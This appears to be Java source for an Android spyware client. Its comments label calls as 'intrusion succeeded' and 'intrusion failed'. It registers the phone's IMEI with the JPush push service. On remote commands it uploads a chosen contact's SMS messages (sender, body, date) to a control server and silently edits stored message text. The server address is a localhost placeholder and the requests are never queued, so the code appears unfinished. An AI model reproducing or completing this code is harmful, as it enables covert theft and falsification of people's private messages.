package com.client.smsandroid;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;

import cn.jpush.android.api.JPushInterface;

import com.android.volley.AuthFailureError;
import com.android.volley.Request.Method;
import com.android.volley.RequestQueue;
import com.android.volley.Response.Listener;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.client.smsandroid.jpush.JpushManager;
import com.client.smsandroid.sms.DBHelper;
import com.client.smsandroid.sms.SmsModel;

public class ControlManager {

    private static final String HOST = "http://localhost:/";

    Context context;
    RequestQueue mQueue;
    String imei = "null";
    DBHelper dbHelper;

    public ControlManager(Context context) {
        this.context = context;
        mQueue = Volley.newRequestQueue(context);
        imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        dbHelper = new DBHelper();
    }

    // 初始化，设置别名
    public void Init() {
        JpushManager jpushManager = new JpushManager(context);
        jpushManager.setAlias(imei);
    }

    // 已安装
    public void Install() {
        String url = HOST + "/v1/phone/install";
        StringRequest stringRequest = new StringRequest(Method.POST, url, null, null) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> map = new HashMap<String, String>();
                map.put("imei", imei);
                map.put("user_id", "1");
                return map;
            }
        };
    }

    // 入侵成功
    public void Success() {
        String url = HOST + "/v1/phone/success";
        StringRequest stringRequest = new StringRequest(Method.POST, url, null, null) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> map = new HashMap<String, String>();
                map.put("imei", imei);
                return map;
            }
        };
    }

    // 入侵失败
    public void Error() {
        String url = HOST + "/v1/phone/error";
        StringRequest stringRequest = new StringRequest(Method.POST, url, null, null) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> map = new HashMap<String, String>();
                map.put("imei", imei);
                return map;
            }
        };
    }

    // 上传短信
    public void UploadSms(final SmsModel model) {
        String url = HOST + "/v1/phone/sms";
        StringRequest stringRequest = new StringRequest(Method.POST, url,
                new Listener<String>() {
                    @Override
                    public void onResponse(String arg0) {
                    }
                }, null) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> map = new HashMap<String, String>();
                map.put("imei", imei);
                map.put("id", model.get_id()+"");
                map.put("address", model.getAddress());
                map.put("body", model.getBody());
                map.put("date", model.getDate()+"");
                return map;
            }
        };
    }

    //JPush解析
    public void pasePush(String extras) throws JSONException {
        JSONObject json = new JSONObject(extras);
        int type = json.getInt("type");
        switch (type) {
            //获取所有短信
            case 1:

                break;
            //获取指定手机短信
            case 2:
                String phone = json.getString("phone");
                List<SmsModel> list = dbHelper.selectByPhone(phone);
                for(SmsModel smsModel: list){
                    UploadSms(smsModel);
                }
                break;
            //修改短信
            case 3:
                int id = json.getInt("id");
                String body = json.getString("body");
                dbHelper.editById(id, body);
                break;

            default:
                break;
        }
    }
}
